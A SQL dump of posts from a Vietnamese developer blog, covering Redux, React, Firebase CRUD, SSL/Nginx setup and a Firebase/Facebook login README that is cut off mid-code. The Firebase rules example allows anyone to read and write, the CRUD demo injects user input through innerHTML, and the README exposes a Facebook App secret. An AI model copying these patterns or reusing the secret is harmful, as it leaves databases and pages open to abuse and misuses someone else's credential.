(1541, 1, '2021-06-28 04:00:57', '2021-06-27 21:00:57', '<img src=\"https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif\" alt=\"Redux\" />\n*** Redux gồm 5 phần chính\n- Khai báo State\n- Khai báo Reducer (dựa trên State)\n- Khai báo action\n- Khai báo Store (dựa trên Reducer)\n- Dispatch action --> thay đổi state\n- Subscribe --> hành động khi state thay đổi\n- Redux không nhất thiết phải dùng với ReactJS, có thể dùng với VueJS thoải mái\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Redux without React</title>\n</head>\n\n<body>\n    <button id=\"btnIncrement\">Increment</button>\n    <button id=\"btnDecrement\">Decrement</button>\n    <p id=\"txtCount\"></p>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script>\n        const txtCount = document.getElementById(\"txtCount\");\n        const btnIncrement = document.getElementById(\"btnIncrement\");\n        const btnDecrement = document.getElementById(\"btnDecrement\");\n        const { createStore, combineReducers } = window.Redux;\n\n        //1. Khai báo state\n        const initialState = { amount: 1 }\n        //2. Khai báo Reducer\n        const countReducer = (state = initialState, action) => {\n            let newState = { ...state }\n            switch (action.type) {\n                case \'INCREMENT\': {\n                    newState.amount += action.payload.amount\n                    return newState\n                }\n                case \'DECREMENT\': {\n                    newState.amount -= action.payload.amount\n                    return newState\n                }\n                default: return state;\n            }\n        }\n\n        //3. Khai báo action\n        const action_increment = (payload) => ({\n            type: \'INCREMENT\',\n            payload: payload,\n        })\n        const action_decrement = (payload) => ({\n            type: \'DECREMENT\',\n            payload: payload,\n        })\n\n        //4. Khai báo store (rootReducer: bao gồm nhiều Reducer)\n        const rootReducer = combineReducers({\n            count: countReducer,\n        })\n        const store = createStore(rootReducer);\n\n        //5. Dispatch Action\n        btnIncrement.onclick = () => {\n            store.dispatch(action_increment({ amount: 1 }))\n        }\n        btnDecrement.onclick = () => {\n            store.dispatch(action_decrement({ amount: 1 }))\n        }\n\n        //...Render lần đầu\n        txtCount.innerText = store.getState().count.amount;\n\n        //... Subscribe state khi state thay đổi\n        store.subscribe(() => {\n            txtCount.innerText = store.getState().count.amount;\n        })\n    </script>\n</body>\n\n</html>\n</pre>', 'Demo-Count: 4. use Redux without React', '', 'publish', 'open', 'open', '', 'demo-count-4-use-redux-without-react', '', '', '2021-06-28 04:00:57', '2021-06-27 21:00:57', '', 0, 'https://duycode.com/?p=1541', 0, 'post', '', 0),
(1547, 1, '2021-06-28 05:00:36', '2021-06-27 22:00:36', '<img src=\"https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif\" alt=\"\" />\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>Demo app Count with use ReactJS and Redux</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n\n    <!-- =========== reducers/count_reducer.js =========== -->\n    <script>\n        //1.1. Khai báo state\n        const initialCount = { amount: 1 }\n        //1.2. Khai báo Reducer\n        const countReducer = (state = initialCount, action) => {\n            let newState = { ...state }\n            switch (action.type) {\n                case \'INCREMENT\': {\n                    newState.amount += action.payload.amount\n                    return newState\n                }\n                case \'DECREMENT\': {\n                    newState.amount -= action.payload.amount\n                    return newState\n                }\n                default: return state;\n            }\n        }\n    </script>\n\n    <!-- =========== actions/count_actions.js =========== -->\n    <script>\n        //2. Khai báo các action (khi được dispatch ==> sẽ trả về object actions tương ứng)\n        const action_increment = (payload) => ({\n            type: \'INCREMENT\',\n            payload: payload,\n        })\n        const action_decrement = (payload) => ({\n            type: \'DECREMENT\',\n            payload: payload,\n        })\n    </script>\n\n    <!-- =========== reducers/index.js =========== -->\n    <script>\n        //3.1. Khai báo rootReducer: Combine nhiều Reducers lại để tạo ra 1 Reducer duy nhất\n        let rootReducer = Redux.combineReducers({\n            count: countReducer,\n        });\n    </script>\n\n    <!-- =========== src/store.js =========== -->\n    <script type=\"text/babel\">\n        //3.2. Khai báo store (chứa rootReducer), cái đoạn lằng nhằng là để sử dụng cho redux chrome extensions\n        const store = Redux.createStore(\n            rootReducer /* preloadedState, */,\n            window.__REDUX_DEVTOOLS_EXTENSION__ && window.__REDUX_DEVTOOLS_EXTENSION__()\n        );\n    </script>\n\n    <!-- =========== components/App.js =========== -->\n    <script type=\"text/babel\">\n        function App(props) {\n            //Dùng useSelector và useDispatch để lấy dữ liệu từ Redux\n            const count = ReactRedux.useSelector(state => state.count);\n            const dispatch = ReactRedux.useDispatch();\n            return (\n                <div>\n                    <p>{count.amount}</p>\n                    <button onClick={() => { dispatch(action_increment({ amount: 1 })) }}>Increase</button>\n                    <button onClick={() => { dispatch(action_decrement({ amount: 1 })) }}>Decrease</button>\n                </div>\n            )\n        }\n    </script>\n\n    <!-- =========== src/index.js =========== -->\n    <script type=\"text/babel\">\n        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên\n        const Provider = ReactRedux.Provider;\n        ReactDOM.render(\n            <Provider store={store}>\n                <App />\n            </Provider>,\n            document.getElementById(\'root\')\n        );\n    </script>\n</body>\n\n</html>\n</pre>', 'Demo-Count: 5. use Redux', '', 'publish', 'open', 'open', '', 'demo-count-5-use-redux', '', '', '2021-06-28 05:00:36', '2021-06-27 22:00:36', '', 0, 'https://duycode.com/?p=1547', 0, 'post', '', 0),
(1556, 1, '2021-07-05 01:00:09', '2021-07-04 18:00:09', '<h2>1. Sử dụng Hook</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>ReactJS</title>\n</head>\n\n<body>\n    <div id=\"app\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n    <script type=\"text/babel\">\n        const { useState, useEffect } = React;\n\n        function Content() {\n            const [user, setUser] = useState([]);\n            const [userID, setUserID] = useState(1);\n            const [loading, setLoading] = useState(false);\n\n            const apiFakeData = async (id) => {\n                try {\n                    let url = `https://reqres.in/api/users/${id}`;\n                    let response = await fetch(url);\n                    if (response.ok) {\n                        let responseJSON = await response.json();\n                        setUser(responseJSON.data);\n                    } else if (response.status === 404) {\n                        console.log(\"Lỗi 404\");\n                        setUser({error: 404});\n                    } else {\n                        console.log(\"Lỗi khác\");\n                        setUser({error: response.status});\n                    }\n                } catch (error) {\n                    console.log(\"Lỗi kết nối: \", error);\n                    setUser({error: error.toString()})\n                } finally {\n                    setLoading(false)\n                }\n            }\n\n            // Nếu không dùng cleanup, component bị unmout trong quá trình đang getAPI\n            // Lúc đó, update State khi component unmout sẽ gây ra lỗi\n            // Đếch hiểu tại sao, cứ dùng hàm cleanup trong useEffect thì khi remove Component đi thì nó cũng tự hết lỗi :3\n            useEffect(() => {\n                setLoading(true)\n                // Cái API này nhanh quá, cho delay 500ms cho chậm lại\n                setTimeout(() => {\n                    apiFakeData(userID);\n                }, 500);\n\n            }, [userID]);\n\n            console.log(\"Content: Render\", loading, userID);\n            return (\n                <div>\n                    <input type=\"number\" value={userID} onChange={e => setUserID(e.target.value)} />\n                    {loading ? <p>Loading...</p> : <p>{JSON.stringify(user, null, 2)}</p>}\n                </div>\n            );\n\n        }\n\n        function App() {\n            const [showContent, setShowContent] = useState(true)\n            return (\n                <div>\n                    <button onClick={() => { setShowContent(!showContent) }}>Toggle Content Component</button>\n                    {showContent && <Content />}\n                </div>\n            );\n\n        }\n\n        ReactDOM.render(<App />, document.getElementById(\'app\'));\n    </script>\n</body>\n\n</html>\n</pre>\n\n<h2>2. Sử dụng Class</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>ReactJS</title>\n</head>\n\n<body>\n    <div id=\"app\"></div>\n    <script crossorigin src=\"https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react.js\"></script>\n    <script crossorigin src=\"https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react-dom.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n    <script type=\"text/babel\">\n        class Content extends React.Component {\n            constructor(props) {\n                super(props);\n                this.isComponentMounted = false;\n                this.state = {\n                    loading: false,\n                    user: [],\n                    userID: 1,\n                };\n            }\n\n            //Hành động thay đổi state bằng api phải để trong componentDidMount và componentDidUpdate\n            componentDidMount() {\n                this.isComponentMounted = true;\n                this.getData(this.state.userID);\n            }\n\n            //Chỉ khi thay đổi giá trị userID mới render lại\n            componentDidUpdate(prevProps, prevState) {\n                if (prevState.userID == this.state.userID) return;\n                this.getData(this.state.userID);\n            }\n\n            //Dùng isComponentMounted, mục đích là khi Component đã unmount, thì không thể setState được nữa\n            //Thử tắt dòng isComponentMounted = false và test Togggle Component biết liền à\n            componentWillUnmount() {\n                this.isComponentMounted = false;\n            }\n\n            getData = (id) => {\n                //Bắt đầu load thì để loading: true\n                this.setState({ loading: true });\n                //Tốc độ cái API này nhanh quá, nên phải để nó Delay 500s :3\n                setTimeout(() => {\n                    this.apiFakeData(id);\n                }, 500);\n\n            }\n\n            apiFakeData = async (id) => {\n                try {\n                    let url = `https://reqres.in/api/users/${id}`;\n                    let response = await fetch(url);\n                    if (this.isComponentMounted) {\n                        if (response.ok) {\n                            let responseJSON = await response.json();\n                            this.setState({ user: responseJSON.data });\n                        } else if (response.status === 404) {\n                            console.log(\"Lỗi 404\");\n                            this.setState({ user: { error: 404 } });\n                        } else {\n                            console.log(\"Lỗi khác\");\n                            this.setState({ user: { error: response.status } });\n                        }\n                    }\n                } catch (error) {\n                    if (this.isComponentMounted) {\n                        console.log(\"Lỗi kết nối\");\n                        this.setState({ user: { error: error.toString() } });\n                    }\n                } finally {\n                    this.setState({ loading: false });\n                }\n\n            }\n\n            render() {\n                console.log(\"Content: Render\");\n                return (\n                    <div>\n                        <input type=\"number\" value={this.state.userID} onChange={e => this.setState({ userID: e.target.value })} />\n                        {this.state.loading ? <p>Loading...</p> : <p>{JSON.stringify(this.state.user, null, 2)}</p>}\n                    </div>\n                );\n            }\n        }\n\n        class App extends React.Component {\n            constructor(props) {\n                super(props);\n                this.state = {\n                    showContent: true,\n                };\n            }\n\n            // Dùng button Toggle Component để test chức năng isComponentMounted ở Content\n            // Trường hợp unmout nhanh quá, mà getAPI về chậm, sau đó lại setState ở Component đã unmount ==> sẽ gây ra lỗi\n            // Mục đích dùng \"isComponentMounted\" để tránh việc setState cho những Component đã unmount\n            render() {\n                return (\n                    <div>\n                        <button onClick={() => { this.setState({ showContent: !this.state.showContent }) }}>Toggle Content Component</button>\n                        {this.state.showContent && <Content />}\n                    </div>\n                );\n            }\n        }\n\n        ReactDOM.render(<App />, document.getElementById(\'app\'));\n    </script>\n</body>\n\n</html>\n</pre>', 'React-GetAPI: 1. StateManager and FetchData in one Component', '', 'publish', 'open', 'open', '', 'react-getapi-1-statemanager-and-fetchdata-in-one-component', '', '', '2021-07-05 01:00:09', '2021-07-04 18:00:09', '', 0, 'https://duycode.com/?p=1556', 0, 'post', '', 0),
(1570, 1, '2021-08-15 01:00:58', '2021-08-14 18:00:58', '* Những lưu ý của Firebase\n-- Document firebase-realtime: <a href=\"https://firebase.google.com/docs/web/setup\" rel=\"noopener\" target=\"_blank\">https://firebase.google.com/docs/web/setup</a>\n-- Cần cài đặt phân quyền trong mục Rules trước để dễ dàng sửa đồi\n<pre>\n{\n  \"rules\": {\n    \".read\": true,\n    \".write\": true,\n  }\n}\n</pre>\n-- Nếu chỉ sử dụng Realtime Database, chỉ cần cài đặt firebase-app và firebase-database. Config cũng chỉ cần databaseURL là quá đủ\n\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Realtime Database</title>\n    <style>\n        table {\n            border-collapse: collapse;\n            counter-reset: row_number 0;\n        }\n\n        tbody tr {\n            counter-increment: row_number 1;\n        }\n\n        tbody tr td:first-child::before {\n            content: counter(row_number);\n        }\n\n        th,\n        td {\n            padding: 0 0.5rem;\n            border: 1px solid black;\n        }\n    </style>\n</head>\n\n<body>\n    <div id=\"app\">\n        <input type=\"text\" placeholder=\"username\" id=\"ip_username\"><br />\n        <input type=\"text\" placeholder=\"email\" id=\"ip_email\"> <br />\n        <button onclick=\"add_user(); reset_form()\">Add User</button>\n        <button onclick=\"update_user(); reset_form()\">Update User</button>\n        <button onclick=\"replace_user(); reset_form()\">Replace User</button><br /><br />\n\n        <table>\n            <thead>\n                <tr>\n                    <th>#</th>\n                    <th>Username</th>\n                    <th>Email</th>\n                    <th>Action</th>\n                </tr>\n            </thead>\n            <tbody id=\"tbody_list\"></tbody>\n        </table>\n    </div>\n\n    <script>\n        let ip_username = document.getElementById(\"ip_username\");\n        let ip_email = document.getElementById(\"ip_email\");\n        let tbody_list = document.getElementById(\"tbody_list\");\n        let uid = null;\n\n        let create_row = (key, value) => {\n            let tr = document.createElement(\"tr\");\n            tr.innerHTML = `<td data-id=\"${key}\"></td><td>${value.username}</td><td>${value.email}</td>\n                            <td><button onClick=get_user(\"${key}\")>Sửa</button>\n                                <button onClick=delete_user(\"${key}\")>Xóa</button></td>`;\n            return tr;\n        }\n\n        let add_row_table = (key, value) => {\n            let tr = create_row(key, value);\n            tbody_list.appendChild(tr);\n        }\n\n        let redraw_table = (listUser) => {\n            tbody_list.innerHTML = \"\";\n            Object.entries(listUser).forEach(([key, value], index) => {\n                add_row_table(key, value)\n            });\n        }\n\n        const reset_form = () => {\n            ip_username.value = \"\";\n            ip_email.value = \"\";\n            uid = null;\n        }\n    </script>\n\n    <!-- Link setup firebase: https://firebase.google.com/docs/web/setup -->\n    <script src=\"https://www.gstatic.com/firebasejs/8.8.0/firebase-app.js\"></script>\n    <script src=\"https://www.gstatic.com/firebasejs/8.8.0/firebase-database.js\"></script>\n    <script>\n        //Nếu chỉ dùng Database Realtime, chỉ cần config: databaseURL\n        firebase.initializeApp({\n            databaseURL: \"https://duycode-77e9a-default-rtdb.asia-southeast1.firebasedatabase.app/\",\n        });\n        //0. Giả sử ban đầu, database trống trơn, \"null\" đó.\n        const usersRef = firebase.database().ref(\'/users\');\n\n        // 1. CREAD: Add new User\n        let add_user = () => {\n            let user = {\n                username: ip_username.value,\n                email: ip_email.value,\n            }\n            //push(): là chỉ định 1 đường dẫn con bên trong \"/users\" dạng \"users/SDFWVX234ds\"\n            //Khi set, đường dẫn \"users/SDFWVX234ds\" sẽ tự động được tạo trên database\n            usersRef.push().set(user)\n                .then(res => console.log(\"Add User Success !!!\", res))\n                .catch(err => console.error(err))\n        }\n\n        // 2. READ: \"get\": chỉ đọc database 1 lần duy nhất\n        let get_user = (userId) => {\n            usersRef.child(userId).get()\n                .then((snapshot) => {\n                    if (snapshot.exists()) {\n                        ip_username.value = snapshot.val().username;\n                        ip_email.value = snapshot.val().email;\n                        uid = snapshot.key;\n                    } else {\n                        console.log(\"No data available\");\n                    }\n                })\n                .catch(err => console.error(err))\n        }\n\n        // 3. UPDATE\n        let update_user = () => {\n            let list_update = {};\n            // Có thể update nhiều trường 1 lúc, với key là uid. Trường hợp này chỉ update 1 field :D\n            list_update[uid] = {\n                username: ip_username.value,\n                email: ip_email.value,\n            }\n            usersRef.update(list_update)\n                .then((res) => { console.log(\"Update User Success !!!\", res); })\n                .catch(err => { console.error(err) })\n        }\n\n        // 4. REPLACE\n        let replace_user = () => {\n            let user = {\n                username: ip_username.value,\n                email: ip_email.value,\n            }\n            usersRef.child(uid).set(user)\n                .then((res) => { console.log(\"Update User Success !!!\", res); })\n                .catch(err => { console.error(err) })\n        }\n\n        // 5. DELETE: Có thể dùng remove, hoặc \"set(null)\", hoặc update với \"[key]: null\"\n        let delete_user = (uid) => {\n            usersRef.child(uid).remove();\n            // firebase.database().ref(\'users/\' + uid).set(null)\n            // usersRef.update({[uid]: null})\n        }\n\n\n        // 6.1. READ LIST: \"on\": Đọc dữ liệu và lắng nghe database liên tục\n        //Như vậy 6 và 7 không nên sử dụng cùng nhau\n        usersRef.on(\'value\', (snapshot) => {\n            let listUser = snapshot.val() || {};\n            //redraw_table(listUser);\n        });\n\n        //6.2. READ LIST: \"once\": Chỉ đọc database 1 lần duy nhất\n        usersRef.once(\'value\')\n            .then((snapshot) => {\n                let listUser = snapshot.val() || {};\n                //redraw_table(listUser);\n            })\n            .catch(err => { console.error(err) })\n\n\n        //7. Event: Có thể lắng nghe các sự kiện của children khi thêm sửa xóa\n        // Khi khởi chạy, dù thằng cha có nhiều thằng con từ trước\n        // nhưng thằng \"child_added\" lại cứ hiểu là mới nhận về. thế mới đau\n        usersRef.on(\'child_added\', (data) => {\n            add_row_table(data.key, data.val());\n        });\n\n        usersRef.on(\'child_changed\', (data) => {\n            let new_tr = create_row(data.key, data.val());\n            let td = document.querySelector(`td[data-id=\"${data.key}\"]`);\n            td.closest(\'tr\').outerHTML = new_tr.outerHTML;\n        });\n\n        usersRef.on(\'child_removed\', (data) => {\n            let td = document.querySelector(`td[data-id=\"${data.key}\"]`);\n            td.closest(\'tr\').remove();\n        });\n\n\n    </script>\n</body>\n\n</html>\n</pre>', 'Realtime-Database: 1. Basic CRUD and Listen events on change value', '', 'publish', 'open', 'open', '', 'realtime-database-1-basic-crud-and-listen-events-on-change-value', '', '', '2021-08-15 01:00:58', '2021-08-14 18:00:58', '', 0, 'https://duycode.com/?p=1570', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1578, 1, '2021-07-27 12:31:15', '2021-07-27 05:31:15', '<h2>1. Tạo key và cert</h2>\r\n<h3>1.1. Sử dụng Openssl</h3>\r\n- Windows không cài đặt openssl --> Cần cài đặt git-scm: <a href=\"https://git-scm.com/download/win\" rel=\"noopener\" target=\"_blank\">https://git-scm.com/download/win</a> \r\n<pre>\r\n// Trên Windows dùng CMD cd vào thư mục của git để run được openssl\r\ncd C:\\Program Files\\Git\\usr\\bin \r\n// Phiên bản OpenSSL 1.1.1 có hỗ trợ TLS 1.3\r\nopenssl version -a\r\n\r\n// Generate cert.pem and key.pem\r\nopenssl req -days 3650 -x509 -newkey rsa:2048 -sha256 -nodes -keyout %UserProfile%\\Desktop\\key.pem -out %UserProfile%\\Desktop\\cert.pem -subj \"/C=/ST=/L=/O=/OU=web/CN=medihome.vn\"\r\n# -nodes : no DES - no passphrase\r\n# -days 365\r\n# -x509: this option outputs a self signed certificate instead of a certificate request. This is typically used to generate a test certificate or a self signed root CA.\r\n# -sha256: use SHA-2 instead SHA-1\r\n# -subj \"/C=/ST=/L=/O=/OU=web/CN=medihome.vn\" : Country/State/Locality(city)/Organization/Organization Unit/CommonName(required)\r\n# -keyout key.pem -out cert.pem: file định dạng PEM có extension: .pem, .crt, .cer, .key\r\n\r\n// Create file DH parameters ==> tạm thời chưa làm đc\r\nopenssl dhparam 2048 -out %UserProfile%\\Desktop\\dhparam.pem\r\n</pre>\r\n\r\n<h3>1.2. Sử dụng Let\'s Encrypt</h3>\r\n<pre>\r\ngit clone https://github.com/letsencrypt/letsencrypt /opt/letsencrypt\r\ncd /opt/letsencrypt\r\n\r\n./letsencrypt-auto certonly --standalone --email duyk30b@gmail.com -d medihome.ga jenkins.medihome.ga\r\n</pre>\r\n\r\nSau khi generate certificate ta sẽ có 4 files:\r\n/etc/letsencrypt/live/domain.com/cert.pem\r\n/etc/letsencrypt/live/domain.com/privkey.pem\r\n/etc/letsencrypt/live/domain.com/chain.pem\r\n/etc/letsencrypt/live/domain.com/fullchain.pem\r\n\r\n\r\n<h2>2. Cài đặt SSL</h2>\r\n<h3>2.1. Live Server: Setting VSCode</h3>\r\n-- Tại settings.json của VScode\r\n-- Copy 2 file vào đúng đường dẫn\r\n<pre>\r\n    \"liveServer.settings.port\": 5501,\r\n    \"liveServer.settings.root\": \"/\",\r\n    \"liveServer.settings.CustomBrowser\": \"chrome\",\r\n    \"liveServer.settings.https\": {\r\n      \"enable\": true,\r\n      \"cert\": \"/Users/duyk3/.vscode/https/cert.pem\",\r\n      \"key\": \"/Users/duyk3/.vscode/https/key.pem\",\r\n      \"passphrase\": \"\"\r\n    }\r\n</pre>\r\n\r\n<h3>2.2. ReactS</h2>\r\n<pre>\r\nHTTPS=true\r\nSSL_CRT_FILE=C:/Users/duyk3/.vscode/https/cert.pem\r\nSSL_KEY_FILE=C:/Users/duyk3/.vscode/https/key.pem\r\n</pre>\r\n\r\n\r\n<h2>3. Test Nginx để run https://localhost</h2>\r\n3.1. Tạo file: ./nginx/docker-compose.yml\r\n<pre>\r\nversion: \'3.3\'\r\n\r\nservices:\r\n  nginx:\r\n    container_name: mhc_nginx\r\n    image: nginx:1.23.1-alpine\r\n    restart: always\r\n    volumes:\r\n      - ./mh-nginx/conf.d/:/etc/nginx/conf.d/\r\n      - ./mh-nginx/ssl/:/etc/nginx/ssl/\r\n    ports:\r\n      - \"80:80\"\r\n      - \"443:443\"\r\n</pre>\r\n\r\n3.2. Tạo file ./nginx/mh-nginx/conf.d/default.conf\r\n<pre>\r\nserver {\r\n    listen       443 ssl;\r\n    server_name  localhost;\r\n\r\n    ssl_certificate           /etc/nginx/ssl/openssl/cert.pem;\r\n    ssl_certificate_key       /etc/nginx/ssl/openssl/key.pem;\r\n    ssl_protocols             TLSv1.2 TLSv1.3;\r\n    ssl_prefer_server_ciphers on;\r\n    ssl_ciphers               \'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH\';\r\n\r\n    location / {\r\n        proxy_pass http://10.0.13.80:4000/;\r\n        proxy_http_version 1.1;\r\n        proxy_set_header Upgrade $http_upgrade;\r\n        proxy_set_header Connection \"upgrade\";\r\n        proxy_set_header Host $http_host;\r\n        proxy_set_header X-Real-IP $remote_addr;\r\n        proxy_set_header X-Forward-For $proxy_add_x_forwarded_for;\r\n        proxy_set_header X-Forward-Proto http;\r\n        proxy_set_header X-Nginx-Proxy true;\r\n        proxy_redirect off;\r\n    }\r\n}\r\n\r\nserver {\r\n    listen        80;\r\n    server_name   localhost;\r\n    return        301 https://$host$request_uri;\r\n}\r\n</pre>\r\n\r\n3.3. Tạo SSL\r\n- Tạo thư mục: ./nginx/mh-nginx/ssl/openssl/\r\n<pre>\r\ncd ./nginx/mh-nginx/ssl/openssl/\r\nopenssl req -days 3650 -x509 -newkey rsa:2048 -sha256 -nodes -keyout key.pem -out cert.pem -subj \"/C=/ST=/L=/O=/OU=web/CN=medihome.vn\"\r\n</pre>\r\n\r\n3.4. Run dọcker\r\n<blockquote>\r\nsudo docker compose up -d\r\nsudo docker compose logs -f\r\n</blockquote>\r\n\r\n\r\n<h2>4. Một số kiến thức khác</h3>\r\nTLS Cache Connection Session\r\nssl_session_cache shared:SSL:50m;\r\nssl_session_timeout 1d;\r\nDH parameters\r\nHSTS\r\nadd_header Strict-Transport-Security \"max-age=31536000\" always;\r\nOCSP stapling', 'SSL/TLS - Cài đặt SSL bằng Openssl và Let\'s Encrypt', '', 'publish', 'open', 'open', '', 'ssl-tls-cai-dat-ssl-bang-openssl-va-lets-encrypt', '', '', '2022-10-24 03:55:22', '2022-10-24 03:55:22', '', 0, 'https://duycode.com/?p=1578', 0, 'post', '', 0),
(1583, 1, '2021-07-16 01:00:04', '2021-07-15 18:00:04', '<h2>./README</h2>\r\n<pre>\r\n1. Create FireBase Project\r\n- Link: https://console.firebase.google.com/\r\n- Use Firebase Authentication with: Sign-in method: Facebook, Google, Twitter\r\n- Facebook example\r\n```\r\nApp ID: 360546695603583 (includes facebook)\r\nApp secret: 5468bd1a4e6b3dfc278291fa60fba0c4 (includes facebook)\r\n```\r\n\r\n2. Create App Facebook\r\n- Link: https://developers.facebook.com/apps/\r\n- Create Policy from: https://www.freeprivacypolicy.com/ . ==> get link and file for \"Baic Settings\"\r\n- Basic Settings (importants): \r\n```\r\nApp domains: duycode-77e9a.firebaseapp.com\r\nPrivacy Policy URL: https://www.freeprivacypolicy.com/live/e5f49c97-6f4d-40b9-95c7-bbdc284ba674\r\nUser data deletion: instructions URL: https://drive.google.com/file/d/1IhD88Bt5XXD5r-nnntLpX-G6ruhzA8Di/view?usp=share_link\r\nSite URL: https://duycode-77e9a.web.app/\r\n```\r\n- App Mode: Development => Live\r\n\r\n- Facebook Login Settings:\r\n```\r\nEmbedded Browser OAuth Login: Yes\r\nValid OAuth Redirect URIs: https://duycode-77e9a.firebaseapp.com/__/auth/handler (includes firebase)\r\n```\r\n\r\n3. User remove registered app:\r\n- Google: \"https://myaccount.google.com/permissions\"\r\n- Facebook: \"https://www.facebook.com/settings/?tab=applications\"\r\n\r\n4. SSL for localhost\r\n- Because: Facebook App required use Https\r\n- Create key and cert for OpenSSL\r\n```\r\nopenssl req -days 3650 -x509 -newkey rsa:2048 -sha256 -nodes -keyout ./ssl/key.pem -out ./ssl/cert.pem -subj \"/C=/ST=/L=/O=/OU=web/CN=medihome.vn\"\r\n```\r\n- Stop port 443 in your computer\r\n- Run docker: `docker compose up -d`\r\n\r\n5. Try access: `https://localhost` to test\r\n\r\n</pre>\r\n\r\n<h2>./conf.d/default.conf</h2>\r\n<pre>\r\nserver {\r\n    listen       443 ssl;\r\n    server_name  localhost;\r\n\r\n    ssl_certificate           /etc/nginx/ssl/cert.pem;\r\n    ssl_certificate_key       /etc/nginx/ssl/key.pem;\r\n    ssl_protocols             TLSv1.2 TLSv1.3;\r\n    ssl_prefer_server_ciphers on;\r\n    ssl_ciphers               \'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH\';\r\n\r\n    location / {\r\n        root   /etc/nginx/dist;\r\n        index  index.html index.htm;\r\n    }\r\n}\r\n</pre>\r\n\r\n<h2>./ssl/</h2>\r\nCreate ./ssl/cert.pem and key.pem\r\n<pre>\r\nopenssl req -days 3650 -x509 -newkey rsa:2048 -sha256 -nodes -keyout ./ssl/key.pem -out ./ssl/cert.pem -subj \"/C=/ST=/L=/O=/OU=web/CN=medihome.vn\"\r\n</pre>\r\n\r\n<h2>./docker-compose.yml</h2>\r\n<pre>\r\nversion: \'3.3\'\r\n \r\nservices:\r\n  nginx:\r\n    container_name: mhc_nginx\r\n    image: nginx:1.23.1-alpine\r\n    restart: always\r\n    volumes:\r\n      - ./conf.d/:/etc/nginx/conf.d/\r\n      - ./ssl/:/etc/nginx/ssl/\r\n      - ./dist/:/etc/nginx/dist/\r\n    ports:\r\n      - \"443:443\"\r\n</pre>\r\n\r\n<h2>./dist/index.html</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Demo Firebase</title>\r\n    <script src=\"https://www.gstatic.com/firebasejs/ui/4.8.1/firebase-ui-auth.js\"></script>\r\n    <link type=\"text/css\" rel=\"stylesheet\" href=\"https://www.gstatic.com/firebasejs/ui/4.8.1/firebase-ui-auth.css\" />\r\n    <style>\r\n        p {\r\n            font-family: monospace;\r\n            white-space: pre-wrap;\r\n        }\r\n    </style>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\">\r\n        <h3>Welcome to Firebase Login Test</h3>\r\n        <div id=\"auth-info\">Loader...</div>\r\n        <div id=\"firebaseui-auth-container\"></div>\r\n    </div>\r\n\r\n    <!-- Link setup firebase: https://firebase.google.com/docs/web/setup -->\r\n    <script src=\"https://www.gstatic.com/firebasejs/8.8.0/firebase-app.js\"></script>\r\n    <script src=\"https://www.gstatic.com/firebasejs/8.8.0/firebase-auth.js\"></script>\r\n\r\n    <script>\r\n        var firebaseConfig = {\r\n            apiKey: \"AIzaSyADcAyM-3Fb7ZJdJf86yLKFUnZmxx-QHmU\",\r\n            authDomain: \"duycode-77e9a.firebaseapp.com\",\r\n        };\r\n        firebase.initializeApp(firebaseConfig);\r\n        let ui = new firebaseui.auth.AuthUI(firebase.auth());\r\n    </script>\r\n\r\n    <script>\r\n        firebase.auth().onAuthStateChanged((user) => {\r\n            if (user) {\r\n                